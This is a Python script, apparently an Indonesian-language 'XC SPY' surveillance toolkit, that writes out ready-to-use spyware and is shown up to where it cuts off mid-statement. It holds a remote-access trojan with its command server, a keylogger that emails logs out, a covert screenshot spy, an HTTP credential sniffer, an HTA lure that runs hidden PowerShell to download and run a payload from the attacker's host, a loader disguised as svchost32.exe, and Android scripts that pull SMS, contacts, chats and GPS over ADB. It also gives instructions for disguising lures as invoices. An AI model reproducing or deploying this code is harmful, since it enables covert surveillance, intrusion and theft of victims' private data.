#!/usr/bin/env python3
"""
XC SPY — Person/Device Surveillance Toolkit
Generate tools siap pakai — tinggal copy-paste atau langsung run
Usage: python3 spy.py <CODENAME> [--lhost IP] [--lport PORT]
"""
import sys, os, argparse, socket, time, threading

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; B = "\033[94m"
M = "\033[95m"; C = "\033[96m"; W = "\033[97m"; D = "\033[90m"
RST = "\033[0m"; BOLD = "\033[1m"

OUT_DIR = "spy_output"

def banner():
    print(f"""{M}{BOLD}
 ██╗  ██╗ ██████╗    ███████╗██████╗ ██╗   ██╗
 ╚██╗██╔╝██╔════╝    ██╔════╝██╔══██╗╚██╗ ██╔╝
  ╚███╔╝ ██║         ███████╗██████╔╝ ╚████╔╝
  ██╔██╗ ██║         ╚════██║██╔═══╝   ╚██╔╝
 ██╔╝ ██╗╚██████╗    ███████║██║        ██║
 ╚═╝  ╚═╝ ╚═════╝    ╚══════╝╚═╝        ╚═╝
{D}       Person & Device Surveillance System{RST}
{D}       XC Hacking Hub — Spy Division{RST}
""")

def ok(msg):     print(f"  {G}{BOLD}[+]{RST} {msg}")
def info(msg):   print(f"  {C}[*]{RST} {msg}")
def saved(path): print(f"  {Y}{BOLD}[SAVED]{RST} {W}{path}{RST}")
def section(t):  print(f"\n{M}{BOLD}{'═'*54}\n  {t}\n{'═'*54}{RST}")
def codeblock(code, lang="python"):
    print(f"\n{D}┌{'─'*52}┐{RST}")
    for line in code.strip().split("\n"):
        print(f"{D}│{RST} {line}")
    print(f"{D}└{'─'*52}┘{RST}")

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close(); return ip
    except: return "YOUR_IP"

def save_tool(filename, code):
    os.makedirs(OUT_DIR, exist_ok=True)
    path = os.path.join(OUT_DIR, filename)
    with open(path, "w") as f:
        f.write(code)
    saved(path)
    return path

# ═══════════════════════════════════════════════════════
#  PHANTOM — Pure Python RAT (no Metasploit needed)
# ═══════════════════════════════════════════════════════

def module_phantom(lhost, lport):
    section("PHANTOM — Python RAT (Siap Pakai)")
    info(f"C2: {lhost}:{lport}")

    agent = f'''#!/usr/bin/env python3
# PHANTOM Agent — jalankan di mesin target
# pip install pillow pyautogui pynput psutil
import socket, subprocess, os, sys, time, threading
import base64, json, platform, getpass, struct

HOST = "{lhost}"
PORT = {lport}

def sysinfo():
    import platform, getpass, socket
    return json.dumps({{
        "host": socket.gethostname(),
        "user": getpass.getuser(),
        "os":   platform.system() + " " + platform.release(),
        "cwd":  os.getcwd(),
    }})

def shell_exec(cmd):
    try:
        out = subprocess.check_output(cmd, shell=True,
              stderr=subprocess.STDOUT, timeout=15)
        return out.decode(errors="ignore")
    except subprocess.TimeoutExpired:
        return "[timeout]"
    except Exception as e:
        return f"[error] {{e}}"

def screenshot_b64():
    try:
        import pyautogui, io
        img = pyautogui.screenshot()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        return base64.b64encode(buf.getvalue()).decode()
    except Exception as e:
        return f"[error] {{e}}"

def keylogger_start(sock):
    try:
        from pynput import keyboard
        buf = []
        def on_press(key):
            try: buf.append(key.char or "")
            except: buf.append(f"[{{key}}]")
            if len(buf) > 50:
                try: sock.send(json.dumps({{"type":"keys","data":"".join(buf)}}).encode() + b"\\n")
                except: pass
                buf.clear()
        listener = keyboard.Listener(on_press=on_press)
        listener.daemon = True
        listener.start()
        return "keylogger started"
    except Exception as e:
        return f"[error] {{e}}"

def send(sock, data):
    msg = json.dumps(data).encode() + b"\\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\\n"):
        chunk = sock.recv(4096)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            send(s, {{"type": "hello", "info": json.loads(sysinfo())}})
            while True:
                cmd = recv(s)
                t = cmd.get("cmd", "")
                if t == "shell":
                    out = shell_exec(cmd["data"])
                    send(s, {{"type":"out","data":out}})
                elif t == "screenshot":
                    send(s, {{"type":"screenshot","data":screenshot_b64()}})
                elif t == "keylog":
                    out = keylogger_start(s)
                    send(s, {{"type":"out","data":out}})
                elif t == "ls":
                    try:
                        files = os.listdir(cmd.get("data", "."))
                        send(s, {{"type":"out","data":"\\n".join(files)}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "cd":
                    try:
                        os.chdir(cmd["data"])
                        send(s, {{"type":"out","data":f"cwd: {{os.getcwd()}}"}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "download":
                    try:
                        with open(cmd["data"], "rb") as f:
                            data = base64.b64encode(f.read()).decode()
                        send(s, {{"type":"file","name":cmd["data"],"data":data}})
                    except Exception as e:
                        send(s, {{"type":"out","data":str(e)}})
                elif t == "sysinfo":
                    send(s, {{"type":"out","data":sysinfo()}})
                elif t == "exit":
                    break
            s.close()
        except:
            time.sleep(10)

connect()
'''

    server = f'''#!/usr/bin/env python3
# PHANTOM Server — jalankan di mesin lo (C2)
import socket, json, base64, os, sys, threading, time
from datetime import datetime

HOST = "0.0.0.0"
PORT = {lport}
agents = {{}}

def send(sock, data):
    msg = json.dumps(data).encode() + b"\\n"
    sock.sendall(msg)

def recv(sock):
    buf = b""
    while not buf.endswith(b"\\n"):
        chunk = sock.recv(65535)
        if not chunk: break
        buf += chunk
    return json.loads(buf.strip())

def handle_agent(conn, addr):
    aid = f"{{addr[0]}}:{{addr[1]}}"
    try:
        hello = recv(conn)
        info = hello.get("info", {{}})
        agents[aid] = {{"sock": conn, "info": info, "addr": addr}}
        print(f"\\n\\033[92m[+] Agent: {{aid}} | {{info.get('user','?')}}@{{info.get('host','?')}} | {{info.get('os','?')}}\\033[0m")
        print(f"\\033[95mPHANTOM\\033[0m \\033[90m»\\033[0m ", end="", flush=True)
    except:
        pass

def agent_shell(aid):
    agent = agents.get(aid)
    if not agent:
        print(f"Agent {{aid}} not found"); return
    sock = agent["sock"]
    info = agent["info"]
    print(f"\\n\\033[93m[SESSION]\\033[0m {{info.get('user')}}@{{info.get('host')}} | \\033[90mCtrl+C = back to menu\\033[0m")
    while True:
        try:
            cmd = input(f"\\033[91m{{info.get('host','?')}}\\033[0m $ ").strip()
            if not cmd: continue
            if cmd == "exit": break
            elif cmd == "screenshot":
                send(sock, {{"cmd":"screenshot"}})
                res = recv(sock)
                ts = datetime.now().strftime("%H%M%S")
                fname = f"screenshot_{{ts}}.png"
                with open(fname,"wb") as f:
                    f.write(base64.b64decode(res["data"]))
                print(f"\\033[92m[+] Saved: {{fname}}\\033[0m")
            elif cmd.startswith("download "):
                path = cmd[9:]
                send(sock, {{"cmd":"download","data":path}})
                res = recv(sock)
                if res["type"] == "file":
                    fname = os.path.basename(res["name"])
                    with open(fname,"wb") as f:
                        f.write(base64.b64decode(res["data"]))
                    print(f"\\033[92m[+] Downloaded: {{fname}}\\033[0m")
                else:
                    print(res.get("data",""))
            elif cmd.startswith("cd "):
                send(sock, {{"cmd":"cd","data":cmd[3:]}})
                print(recv(sock).get("data",""))
            elif cmd == "keylog":
                send(sock, {{"cmd":"keylog"}})
                print(recv(sock).get("data",""))
            elif cmd == "sysinfo":
                send(sock, {{"cmd":"sysinfo"}})
                print(recv(sock).get("data",""))
            else:
                send(sock, {{"cmd":"shell","data":cmd}})
                print(recv(sock).get("data","").strip())
        except KeyboardInterrupt:
            print(); break
        except Exception as e:
            print(f"[!] {{e}}"); break

def menu():
    while True:
        print(f"\\n\\033[95m{'─'*40}\\033[0m")
        print(f"  Agents online: {{len(agents)}}")
        for i,(aid,a) in enumerate(agents.items()):
            info = a['info']
            print(f"  [{{i}}] {{aid}} | {{info.get('user','?')}}@{{info.get('host','?')}}")
        print(f"\\033[95m{'─'*40}\\033[0m")
        try:
            cmd = input(f"\\033[95mPHANTOM\\033[0m \\033[90m»\\033[0m ").strip()
            if cmd.isdigit():
                aid = list(agents.keys())[int(cmd)]
                agent_shell(aid)
            elif cmd == "list":
                pass
            elif cmd in ("exit","quit"):
                sys.exit(0)
        except (KeyboardInterrupt, IndexError, EOFError):
            print()

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server.bind((HOST, PORT))
server.listen(10)
print(f"\\033[95m[PHANTOM C2]\\033[0m Listening on {{HOST}}:{{PORT}}")

def accept_loop():
    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_agent, args=(conn, addr), daemon=True).start()

threading.Thread(target=accept_loop, daemon=True).start()
menu()
'''

    save_tool("phantom_agent.py", agent)
    save_tool("phantom_server.py", server)

    print(f"\n{Y}Cara pakai:{RST}")
    print(f"""
  {C}# Di mesin lo — jalankan C2 server:{RST}
  {G}python3 spy_output/phantom_server.py{RST}

  {C}# Di target — jalankan agent:{RST}
  {G}pip install pyautogui pynput pillow{RST}
  {G}python3 spy_output/phantom_agent.py{RST}

  {C}# Atau compile ke EXE (Windows, tanpa Python):{RST}
  {G}pyinstaller --onefile --noconsole phantom_agent.py{RST}

  {C}# Command setelah konek:{RST}
  {W}shell <cmd>      → exec command{RST}
  {W}screenshot       → capture screen → save PNG{RST}
  {W}download <path>  → ambil file{RST}
  {W}keylog           → mulai keylogger{RST}
  {W}sysinfo          → info sistem target{RST}
  {W}cd <path>        → pindah direktori{RST}
""")

# ═══════════════════════════════════════════════════════
#  SHADOW — Keylogger Standalone
# ═══════════════════════════════════════════════════════

def module_shadow():
    section("SHADOW — Keylogger (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# SHADOW Keylogger — silent, email exfil optional
# pip install pynput
import os, time, socket, platform, getpass, threading
from datetime import datetime
try: from pynput import keyboard
except: os.system("pip install pynput -q"); from pynput import keyboard

# ── Config ──────────────────
LOG  = os.path.join(os.getenv("TEMP", "/tmp"), ".shdw_cache")
MAIL = False          # True = auto kirim via email
TO   = "kamu@gmail.com"
FRM  = "pengirim@gmail.com"
PWD  = "app_password_gmail"
IVTL = 300            # kirim tiap N detik
# ────────────────────────────

buf = [f"[{socket.gethostname()}][{getpass.getuser()}][{platform.system()}][{datetime.now():%Y-%m-%d %H:%M}]\\n"]

SPECIALS = {
    keyboard.Key.space:     " ",
    keyboard.Key.enter:     "\\n[ENT]\\n",
    keyboard.Key.backspace: "[BS]",
    keyboard.Key.tab:       "[TAB]",
    keyboard.Key.delete:    "[DEL]",
    keyboard.Key.ctrl_l:    "[CTL]",
    keyboard.Key.alt_l:     "[ALT]",
    keyboard.Key.shift:     "[SHF]",
}

def on_press(key):
    try:    buf.append(key.char)
    except: buf.append(SPECIALS.get(key, f"[{key}]"))
    if len(buf) > 80: flush()

def flush():
    global buf
    with open(LOG, "a", encoding="utf-8") as f:
        f.write("".join(buf))
    buf = []

def mail_loop():
    while True:
        time.sleep(IVTL)
        flush()
        if not MAIL: continue
        try:
            import smtplib
            from email.mime.text import MIMEText
            with open(LOG, encoding="utf-8", errors="ignore") as f:
                body = f.read()
            if not body.strip(): continue
            msg = MIMEText(body)
            msg["Subject"] = f"[SHDW] {socket.gethostname()} {datetime.now():%H:%M}"
            msg["From"] = FRM; msg["To"] = TO
            with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
                s.login(FRM, PWD); s.send_message(msg)
            open(LOG, "w").close()
        except: pass

threading.Thread(target=mail_loop, daemon=True).start()
keyboard.Listener(on_press=on_press).join()
'''
    save_tool("shadow_keylogger.py", code)
    codeblock(code[:800] + "\n# ... (full code di spy_output/shadow_keylogger.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install pynput{RST}
  {G}python3 spy_output/shadow_keylogger.py{RST}

  {C}Compile ke EXE (invisible, no console):{RST}
  {G}pyinstaller --onefile --noconsole shadow_keylogger.py{RST}

  {C}Log tersimpan di:{RST}
  {W}Windows: %TEMP%\\.shdw_cache{RST}
  {W}Linux:   /tmp/.shdw_cache{RST}

  {C}Aktifin email exfil:{RST}
  {W}Set MAIL = True → isi TO + PWD (Gmail App Password){RST}
""")

# ═══════════════════════════════════════════════════════
#  ECLIPSE — Screen Spy
# ═══════════════════════════════════════════════════════

def module_eclipse():
    section("ECLIPSE — Screen Spy (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# ECLIPSE Screen Spy — screenshot diam-diam
# pip install pillow pyautogui
import os, time, io, threading, socket
from datetime import datetime
try: import pyautogui
except: os.system("pip install pyautogui pillow -q"); import pyautogui

# ── Config ──────────────────
INTERVAL = 30         # screenshot tiap N detik
SAVE_DIR = os.path.join(os.getenv("TEMP", "/tmp"), ".eclp")
MAIL     = False
TO       = "kamu@gmail.com"
FRM      = "pengirim@gmail.com"
PWD      = "app_password"
# ────────────────────────────

os.makedirs(SAVE_DIR, exist_ok=True)

def snap():
    try:
        img = pyautogui.screenshot()
        ts  = datetime.now().strftime("%Y%m%d_%H%M%S")
        path = os.path.join(SAVE_DIR, f"{ts}.png")
        img.save(path)
        if MAIL: send_mail(img)
        return path
    except Exception as e:
        return str(e)

def send_mail(img):
    try:
        import smtplib, io
        from email.mime.multipart import MIMEMultipart
        from email.mime.image import MIMEImage
        buf = io.BytesIO()
        img.save(buf, format="PNG"); buf.seek(0)
        msg = MIMEMultipart()
        msg["Subject"] = f"[ECLP] {socket.gethostname()} {datetime.now():%H:%M}"
        msg["From"] = FRM; msg["To"] = TO
        msg.attach(MIMEImage(buf.read()))
        with smtplib.SMTP_SSL("smtp.gmail.com", 465) as s:
            s.login(FRM, PWD); s.send_message(msg)
    except: pass

while True:
    snap()
    time.sleep(INTERVAL)
'''
    save_tool("eclipse_screen.py", code)
    codeblock(code[:600] + "\n# ... (full code di spy_output/eclipse_screen.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install pillow pyautogui{RST}
  {G}python3 spy_output/eclipse_screen.py{RST}

  {C}Screenshot tersimpan di:{RST}
  {W}Windows: %TEMP%\\.eclp\\{RST}
  {W}Linux:   /tmp/.eclp/{RST}

  {C}Compile ke EXE:{RST}
  {G}pyinstaller --onefile --noconsole eclipse_screen.py{RST}
""")

# ═══════════════════════════════════════════════════════
#  VENOM — Network Sniffer / MITM
# ═══════════════════════════════════════════════════════

def module_venom(iface="wlan0"):
    section("VENOM — Network Sniffer (Siap Pakai)")

    code = '''#!/usr/bin/env python3
# VENOM Sniffer — intercept HTTP credentials & cookies
# pip install scapy
import re, sys
from scapy.all import sniff, IP, TCP, Raw

# ── Config ──────────────────
IFACE   = "wlan0"     # ganti sesuai interface lo
TARGETS = []          # kosong = semua IP
LOG     = "venom_capture.log"
# ────────────────────────────

KEYWORDS = [
    "password","passwd","pass","pwd","secret",
    "username","user","login","email","token",
    "authorization","cookie","session","auth",
    "credential","apikey","api_key","access_token",
]

def log(msg):
    print(msg)
    with open(LOG, "a") as f: f.write(msg + "\\n")

def extract_creds(payload):
    hits = []
    for kw in KEYWORDS:
        pattern = rf"{kw}[=:]([^&\\s\"\'<>{{}}]+)"
        matches = re.findall(pattern, payload, re.IGNORECASE)
        for m in matches:
            hits.append(f"{kw}={m}")
    return hits

def packet_handler(pkt):
    if not (pkt.haslayer(TCP) and pkt.haslayer(Raw)):
        return
    try:
        payload = pkt[Raw].load.decode("utf-8", errors="ignore")
    except: return

    src = pkt[IP].src if pkt.haslayer(IP) else "?"
    dst = pkt[IP].dst if pkt.haslayer(IP) else "?"

    if TARGETS and src not in TARGETS and dst not in TARGETS:
        return

    # HTTP Request
    if payload.startswith(("GET ","POST ","PUT ","DELETE ","PATCH ")):
        lines = payload.split("\\r\\n")
        method_line = lines[0]
        host = next((l[6:] for l in lines if l.startswith("Host:")), dst)
        log(f"\\n[HTTP] {src} → {host}")
        log(f"  {method_line}")

        # Extract headers
        for l in lines[1:]:
            if any(k in l.lower() for k in ["cookie","authorization","token"]):
                log(f"  {l}")

        # Extract POST body
        if "\\r\\n\\r\\n" in payload:
            body = payload.split("\\r\\n\\r\\n", 1)[1]
            if body:
                creds = extract_creds(body)
                if creds:
                    log(f"  \\033[91m[CREDS]\\033[0m {' | '.join(creds)}")
                    log(f"  [BODY] {body[:200]}")

print(f"[VENOM] Sniffing on {IFACE} — log: {LOG}")
print("[VENOM] Ctrl+C to stop\\n")
sniff(iface=IFACE, filter="tcp port 80", prn=packet_handler, store=0)
'''
    save_tool("venom_sniffer.py", code)
    codeblock(code[:700] + "\n# ... (full code di spy_output/venom_sniffer.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}pip install scapy{RST}
  {G}sudo python3 spy_output/venom_sniffer.py{RST}

  {C}Ganti interface sesuai lo:{RST}
  {W}ip a           → lihat nama interface{RST}
  {W}IFACE = "eth0" → kalau kabel{RST}
  {W}IFACE = "wlan0"→ kalau WiFi{RST}

  {C}Target spesifik:{RST}
  {W}TARGETS = ["192.168.1.5"] → hanya monitor 1 IP{RST}
""")

# ═══════════════════════════════════════════════════════
#  NEXUS — C2 Server + Agent
# ═══════════════════════════════════════════════════════

def module_nexus(lhost, lport):
    section("NEXUS — C2 Server (Siap Pakai)")
    info("Sama dengan PHANTOM server — NEXUS = multi-agent manager")

    code_server = f'''#!/usr/bin/env python3
# NEXUS C2 Server — multi-agent command center
import socket, threading, sys, json, time, os

HOST = "0.0.0.0"; PORT = {lport}
agents = {{}}; lock = threading.Lock()

def send(s, d): s.sendall((json.dumps(d)+"\\n").encode())
def recv(s):
    b = b""
    while not b.endswith(b"\\n"):
        c = s.recv(4096)
        if not c: break
        b += c
    return json.loads(b.strip())

def handle(conn, addr):
    aid = f"{{addr[0]}}:{{addr[1]}}"
    try:
        hello = recv(conn)
        with lock: agents[aid] = {{"sock":conn,"info":hello.get("info",{{}}),"addr":addr}}
        print(f"\\n\\033[92m[+] {{aid}}\\033[0m | {{hello.get('info',{{}})}}")
        while True: time.sleep(1)
    except: pass
    finally:
        with lock: agents.pop(aid, None)
        conn.close()

def cmd_agent(aid, cmd_str):
    a = agents.get(aid)
    if not a: return "[agent gone]"
    send(a["sock"], {{"cmd":"shell","data":cmd_str}})
    return recv(a["sock"]).get("data","")

def menu():
    print(f"\\033[95m[NEXUS C2]\\033[0m {{HOST}}:{{PORT}}")
    while True:
        try:
            c = input(f"\\033[95mNEXUS\\033[0m » ").strip()
            if c == "list":
                for i,(k,v) in enumerate(agents.items()):
                    print(f"  [{{i}}] {{k}} | {{v['info']}}")
            elif c.startswith("use "):
                idx = int(c[4:])
                aid = list(agents.keys())[idx]
                a = agents[aid]
                print(f"\\n[SESSION] {{aid}} | Ctrl+C = menu")
                while True:
                    try:
                        inp = input(f"\\033[91m{{aid}}\\033[0m $ ")
                        if inp == "back": break
                        print(cmd_agent(aid, inp))
                    except KeyboardInterrupt: break
            elif c in ("exit","quit"): sys.exit(0)
        except (KeyboardInterrupt, EOFError): print(); break
        except Exception as e: print(f"[!] {{e}}")

srv = socket.socket(); srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind((HOST, PORT)); srv.listen(20)
threading.Thread(target=lambda: [handle(*srv.accept()) for _ in iter(int,1)], daemon=True).start()
menu()
'''

    code_agent = f'''#!/usr/bin/env python3
# NEXUS Agent — deploy ke target
import socket, subprocess, json, time, os

C2 = "{lhost}"; PORT = {lport}

def send(s, d): s.sendall((json.dumps(d)+"\\n").encode())
def recv(s):
    b = b""
    while not b.endswith(b"\\n"):
        c = s.recv(65535)
        if not c: break
        b += c
    return json.loads(b.strip())

def run(cmd):
    try: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10).decode(errors="ignore")
    except Exception as e: return str(e)

import platform, getpass, socket as sock
info = {{"host": sock.gethostname(), "user": getpass.getuser(), "os": platform.system()}}

while True:
    try:
        s = socket.socket()
        s.connect((C2, PORT))
        send(s, {{"type":"hello","info":info}})
        while True:
            cmd = recv(s)
            out = run(cmd.get("data",""))
            send(s, {{"type":"out","data":out}})
        s.close()
    except: time.sleep(10)
'''

    save_tool("nexus_server.py", code_server)
    save_tool("nexus_agent.py", code_agent)
    codeblock(code_server[:600] + "\n# ... (full code di spy_output/nexus_server.py)")

    print(f"""
  {C}Cara pakai:{RST}
  {G}# Server (di mesin lo):{RST}
  {G}python3 spy_output/nexus_server.py{RST}

  {G}# Agent (di target):{RST}
  {G}python3 spy_output/nexus_agent.py{RST}

  {C}Command di NEXUS shell:{RST}
  {W}list      → lihat semua agent online{RST}
  {W}use 0     → masuk ke agent #0{RST}
  {W}<command> → exec di target{RST}
  {W}back      → balik ke menu{RST}
""")

# ═══════════════════════════════════════════════════════
#  MIRAGE — Social Engineering Lure Generator
# ═══════════════════════════════════════════════════════

def module_mirage(lhost, lport, target="target"):
    section("MIRAGE — Lure Generator (Siap Pakai)")

    # HTA lure
    hta = f"""<html><head><hta:application showInTaskbar="no"/>
<script language="VBScript">
Sub Window_OnLoad
  Set WS = CreateObject("WScript.Shell")
  WS.Run "powershell -w hidden -nop -c \\"IEX(New-Object Net.WebClient).DownloadString('http://{lhost}/p.ps1')\\"", 0
  window.close
End Sub
</script></head>
<body><p>Loading document...</p></body></html>"""
    save_tool(f"Dokumen_{target}.hta", hta)

    # PowerShell downloader
    ps1 = f"""# MIRAGE PS1 — download & exec payload
$url = "http://{lhost}/phantom_agent.exe"
$out = "$env:TEMP\\svchost32.exe"
(New-Object Net.WebClient).DownloadFile($url, $out)
Start-Process $out -WindowStyle Hidden"""
    save_tool("loader.ps1", ps1)

    # Python http server helper
    srv = f"""#!/usr/bin/env python3
# MIRAGE Server — host payload ke target
import http.server, socketserver, os
PORT = 80
os.chdir("spy_output")
Handler = http.server.SimpleHTTPRequestHandler
with socketserver.TCPServer(("", PORT), Handler) as h:
    print(f"[MIRAGE] Serving spy_output/ on :{PORT}")
    h.serve_forever()
"""
    save_tool("mirage_server.py", srv)

    print(f"""
  {C}File yang di-generate:{RST}
  {W}spy_output/Dokumen_{target}.hta  → jebak via email / chat{RST}
  {W}spy_output/loader.ps1            → PS1 one-liner loader{RST}
  {W}spy_output/mirage_server.py      → host payload ke target{RST}

  {C}Attack flow:{RST}
  {G}# 1. Compile PHANTOM agent ke exe dulu{RST}
  {G}pyinstaller --onefile --noconsole spy_output/phantom_agent.py{RST}
  {G}cp dist/phantom_agent.exe spy_output/{RST}

  {G}# 2. Jalankan NEXUS/PHANTOM server{RST}
  {G}python3 spy_output/nexus_server.py &{RST}

  {G}# 3. Host file via MIRAGE server{RST}
  {G}sudo python3 spy_output/mirage_server.py &{RST}

  {G}# 4. Kirim .hta ke target → target klik → owned 🔥{RST}

  {C}Cara kirim:{RST}
  {W}Email attachment, Telegram, WA, Discord, Google Drive link{RST}
  {W}Rename: "Tagihan_Listrik.hta" / "Invoice_2025.hta"{RST}
""")

# ═══════════════════════════════════════════════════════
#  SPECTRE — Android Spy (Full 4-Mode)
# ═══════════════════════════════════════════════════════

def module_spectre(lhost, lport):
    section("SPECTRE — Android Spy v2 (4 Mode)")
    info(f"C2: {lhost}:{lport}")

    # ── Mode A: ADB USB Full Extraction ──────────────────
    adb_usb = f'''#!/usr/bin/env python3
# SPECTRE-A: ADB USB Full Extraction
# Butuh: adb di PATH + USB Debugging ON
import subprocess, os, json, time
from datetime import datetime

LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

def adb(*args):
    r = subprocess.run(["adb"] + list(args), capture_output=True, text=True, timeout=30)
    return (r.stdout + r.stderr).strip()

def pull(src, dst=None):
    dst = dst or os.path.join(LOOT, os.path.basename(src))
    adb("pull", src, dst)
    return dst

def shell(cmd): return adb("shell", cmd)

def log(msg, data=""):
    line = f"[{{datetime.now():%H:%M:%S}}] {{msg}}"
    print(line)
    if data: print(f"  {{data[:200]}}")

log("Connecting...")
devs = adb("devices")
log("Devices", devs)
if "device" not in devs:
    print("[!] No device. USB debugging on?"); exit(1)

# Device info
info_data = {{
    "model":    shell("getprop ro.product.model"),
    "android":  shell("getprop ro.build.version.release"),
    "serial":   shell("getprop ro.serialno"),
    "imei":     shell("service call iphonesubinfo 1 | grep -o '[0-9]\\\\+' | tr -d '\\\\n'"),
    "phone":    shell("service call iphonesubinfo 15 | grep -o '[0-9-+]\\\\+' | tr -d '\\\\n'"),
    "accounts": shell("dumpsys account | grep name= | head -20"),
    "sim":      shell("getprop gsm.sim.operator.alpha"),
    "battery":  shell("dumpsys battery | grep level"),
    "wifi_ip":  shell("ip route get 1 | awk '{{print $NF}}'"),
}}
with open(f"{{LOOT}}/device_info.json","w") as f: json.dump(info_data, f, indent=2)
log("Device info saved", str(info_data))

# Screenshot
log("Screenshot...")
shell("screencap -p /sdcard/.xc_sc.png")
pull("/sdcard/.xc_sc.png", f"{{LOOT}}/screenshot.png")
shell("rm /sdcard/.xc_sc.png")

# GPS
log("GPS location...")
gps = shell("dumpsys location | grep -A2 'last known'")
with open(f"{{LOOT}}/gps.txt","w") as f: f.write(gps)
log("GPS", gps)

# Contacts DB
log("Contacts...")
pull("/data/data/com.android.providers.contacts/databases/contacts2.db", f"{{LOOT}}/contacts2.db")

# SMS DB
log("SMS...")
pull("/data/data/com.android.providers.telephony/databases/mmssms.db", f"{{LOOT}}/mmssms.db")

# Call log (readable)
log("Call log...")
calls = shell("content query --uri content://call_log/calls --projection number:duration:type:date | head -100")
with open(f"{{LOOT}}/calllog.txt","w") as f: f.write(calls)

# WhatsApp
log("WhatsApp backup DBs...")
os.makedirs(f"{{LOOT}}/whatsapp", exist_ok=True)
adb("pull", "/sdcard/WhatsApp/Databases/", f"{{LOOT}}/whatsapp/")

# Photos (recent 20)
log("Recent photos...")
os.makedirs(f"{{LOOT}}/photos", exist_ok=True)
photos = shell("find /sdcard/DCIM -name '*.jpg' | sort -r | head -20").splitlines()
for p in photos:
    if p.strip(): adb("pull", p.strip(), f"{{LOOT}}/photos/")

# Installed apps
log("Apps list...")
apps = shell("pm list packages -3")
with open(f"{{LOOT}}/apps.txt","w") as f: f.write(apps)

# Clipboard
log("Clipboard...")
clip = shell("am broadcast -a clipper.GET --ez get true 2>/dev/null || dumpsys clipboard 2>/dev/null | head -20")
with open(f"{{LOOT}}/clipboard.txt","w") as f: f.write(clip)

# Browser history (Chrome)
log("Chrome history...")
pull("/data/data/com.android.chrome/app_chrome/Default/History", f"{{LOOT}}/chrome_history.db")

# Telegram
log("Telegram DB...")
pull("/data/data/org.telegram.messenger/files/", f"{{LOOT}}/telegram/")

print(f"\\n[SPECTRE-A] Done! Loot dir: {{LOOT}}/")
for f in os.listdir(LOOT):
    size = os.path.getsize(os.path.join(LOOT,f)) if os.path.isfile(os.path.join(LOOT,f)) else 0
    print(f"  {{f}} ({{size}} bytes)" if size else f"  {{f}}/")
'''

    # ── Mode B: ADB Network Scanner ──────────────────────
    adb_net = f'''#!/usr/bin/env python3
# SPECTRE-B: ADB Network Scanner — cari HP dengan TCP ADB aktif
# Port 5555 = ADB over WiFi/network
# Butuh: adb di PATH
import subprocess, socket, threading, ipaddress, os, sys
from datetime import datetime

LOOT = "spectre_loot"
os.makedirs(LOOT, exist_ok=True)

found = []
lock  = threading.Lock()

def adb(device, *args):
    r = subprocess.run(["adb", "-s", device] + list(args),
                       capture_output=True, text=True, timeout=10)
    return (r.stdout + r.stderr).strip()

def check_host(ip, port=5555):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        if s.connect_ex((ip, port)) == 0:
            with lock: found.append(f"{{ip}}:{{port}}")
            print(f"  \\033[92m[FOUND] {{ip}}:{{port}}\\033[0m")
        s.close()
    except: pass

def get_local_subnet():
    import socket as sock
    try:
        s = sock.socket(sock.AF_INET, sock.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]; s.close()
        return str(ipaddress.IPv4Network(ip + "/24", strict=False))
    except: return "192.168.1.0/24"

subnet = sys.argv[1] if len(sys.argv)>1 else get_local_subnet()
print(f"[SPECTRE-B] Scanning {{subnet}} for ADB TCP (port 5555)...")

threads = []
for ip in ipaddress.IPv4Network(subnet, strict=False).hosts():
    t = threading.Thread(target=check_host, args=(str(ip),), daemon=True)
    t.start(); threads.append(t)
for t in threads: t.join(timeout=2)

if not found:
    print("\\n[!] No ADB TCP devices found.")
    print("    Pastikan target Android: Developer Options → ADB over WiFi ON")
    exit(0)

print(f"\\n[+] {{len(found)}} device(s) found:")
for i, dev in enumerate(found):
    print(f"  [{{i}}] {{dev}}")

# Connect + auto-extract
for dev in found:
    print(f"\\n[*] Connecting: {{dev}}")
    r = subprocess.run(["adb", "connect", dev], capture_output=True, text=True)
    print(f"  {{r.stdout.strip()}}")
    if "connected" in r.stdout or "already" in r.stdout:
        print(f"  [+] Connected! Grabbing data...")
        # Quick grab
        model   = adb(dev, "shell", "getprop ro.product.model")
        android = adb(dev, "shell", "getprop ro.build.version.release")
        user    = adb(dev, "shell", "whoami")
        gps     = adb(dev, "shell", "dumpsys location | grep -A2 'last known'")
        apps    = adb(dev, "shell", "pm list packages -3 | wc -l")
        print(f"  Model   : {{model}}")
        print(f"  Android : {{android}}")
        print(f"  User    : {{user}}")
        print(f"  GPS     : {{gps[:100]}}")
        print(f"  Apps    : {{apps}} third-party installed")

        safe_ip = dev.replace(":","_")
        loot_dev = f"{{LOOT}}/{{safe_ip}}"
        os.makedirs(loot_dev, exist_ok=True)

        # Screenshot
        adb(dev, "shell", "screencap -p /sdcard/.sp.png")
        adb(dev, "pull", "/sdcard/.sp.png", f"{{loot_dev}}/screenshot.png")
        adb(dev, "shell", "rm /sdcard/.sp.png")

        # Contacts + SMS
        adb(dev, "pull",
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            f"{{loot_dev}}/contacts2.db")
        adb(dev, "pull",
